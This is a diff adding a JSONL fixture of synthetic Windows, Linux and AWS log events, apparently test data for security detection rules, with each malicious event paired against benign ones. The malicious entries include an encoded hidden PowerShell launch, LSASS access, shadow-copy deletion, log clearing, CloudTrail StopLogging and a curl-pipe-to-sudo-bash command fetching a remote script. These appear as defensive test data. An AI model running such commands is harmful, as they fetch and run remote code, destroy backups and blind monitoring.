@@ -1,0 +1,44 @@
+{"UtcTime": "2026-10-30T10:00:01Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"}
+{"UtcTime": "2026-10-30T10:00:02Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1 -Environment prod"}
+{"UtcTime": "2026-10-30T10:00:03Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"}
+{"UtcTime": "2026-10-30T10:01:00Z", "product": "windows", "EventID": 10, "SourceImage": "C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010"}
+{"UtcTime": "2026-10-30T10:01:01Z", "product": "windows", "EventID": 10, "SourceImage": "C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010"}
+{"UtcTime": "2026-10-30T10:01:02Z", "product": "windows", "EventID": 10, "SourceImage": "C:\\Windows\\explorer.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1000"}
+{"UtcTime": "2026-10-30T10:02:00Z", "product": "windows", "EventID": 1, "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /c whoami"}
+{"UtcTime": "2026-10-30T10:02:01Z", "product": "windows", "EventID": 1, "ParentImage": "C:\\Windows\\explorer.exe", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd"}
+{"UtcTime": "2026-10-30T10:03:00Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "203.0.113.50", "TargetUserName": "user0"}
+{"UtcTime": "2026-10-30T10:03:05Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "203.0.113.50", "TargetUserName": "user5"}
+{"UtcTime": "2026-10-30T10:03:10Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "203.0.113.50", "TargetUserName": "user10"}
+{"UtcTime": "2026-10-30T10:03:15Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "203.0.113.50", "TargetUserName": "user15"}
+{"UtcTime": "2026-10-30T10:03:20Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "203.0.113.50", "TargetUserName": "user20"}
+{"UtcTime": "2026-10-30T10:03:25Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "203.0.113.50", "TargetUserName": "user25"}
+{"UtcTime": "2026-10-30T10:03:00Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "10.0.0.7", "TargetUserName": "alice"}
+{"UtcTime": "2026-10-30T10:03:40Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "10.0.0.7", "TargetUserName": "alice"}
+{"UtcTime": "2026-10-30T10:04:00Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "198.51.100.9", "TargetUserName": "x"}
+{"UtcTime": "2026-10-30T10:05:00Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "198.51.100.9", "TargetUserName": "x"}
+{"UtcTime": "2026-10-30T10:06:00Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "198.51.100.9", "TargetUserName": "x"}
+{"UtcTime": "2026-10-30T10:07:00Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "198.51.100.9", "TargetUserName": "x"}
+{"UtcTime": "2026-10-30T10:08:00Z", "product": "windows", "EventID": 4625, "LogonType": 3, "IpAddress": "198.51.100.9", "TargetUserName": "x"}
+{"UtcTime": "2026-10-30T10:05:00Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\schtasks.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "schtasks /create /sc minute /tn upd /tr C:\\Users\\Public\\u.exe"}
+{"UtcTime": "2026-10-30T10:05:01Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\schtasks.exe", "ParentImage": "C:\\Windows\\System32\\msiexec.exe", "CommandLine": "schtasks /create /tn Updater"}
+{"UtcTime": "2026-10-30T10:05:02Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\schtasks.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "schtasks /query"}
+{"UtcTime": "2026-10-30T10:06:00Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe Delete Shadows /All /Quiet"}
+{"UtcTime": "2026-10-30T10:06:01Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin list shadows"}
+{"UtcTime": "2026-10-30T10:07:00Z", "product": "windows", "EventID": 1102, "Channel": "Security", "SubjectUserName": "eve"}
+{"UtcTime": "2026-10-30T10:07:01Z", "product": "windows", "EventID": 104, "Channel": "System"}
+{"UtcTime": "2026-10-30T10:08:00Z", "product": "linux", "EventID": "execve", "CommandLine": "curl -fsSL http://203.0.113.9/i.sh | sudo bash"}
+{"UtcTime": "2026-10-30T10:08:01Z", "product": "linux", "EventID": "execve", "CommandLine": "curl -o report.csv https://intranet/report"}
+{"UtcTime": "2026-10-30T10:08:02Z", "product": "linux", "EventID": "execve", "CommandLine": "cat notes | grep curl"}
+{"UtcTime": "2026-10-30T10:09:00Z", "product": "aws", "eventSource": "cloudtrail.amazonaws.com", "eventName": "StopLogging", "sourceIPAddress": "198.51.100.4"}
+{"UtcTime": "2026-10-30T10:09:01Z", "product": "aws", "eventSource": "cloudtrail.amazonaws.com", "eventName": "DescribeTrails"}
+{"UtcTime": "2026-10-30T10:09:02Z", "product": "aws", "eventSource": "s3.amazonaws.com", "eventName": "DeleteBucket"}
+{"UtcTime": "2026-10-30T10:00:30Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "notepad.exe"}
+{"UtcTime": "2026-10-30T10:01:30Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "notepad.exe"}
+{"UtcTime": "2026-10-30T10:02:30Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "notepad.exe"}
+{"UtcTime": "2026-10-30T10:03:30Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "notepad.exe"}
+{"UtcTime": "2026-10-30T10:04:30Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "notepad.exe"}
+{"UtcTime": "2026-10-30T10:05:30Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "notepad.exe"}
+{"UtcTime": "2026-10-30T10:06:30Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "notepad.exe"}
+{"UtcTime": "2026-10-30T10:07:30Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "notepad.exe"}
+{"UtcTime": "2026-10-30T10:08:30Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "notepad.exe"}
+{"UtcTime": "2026-10-30T10:09:30Z", "product": "windows", "EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "notepad.exe"}
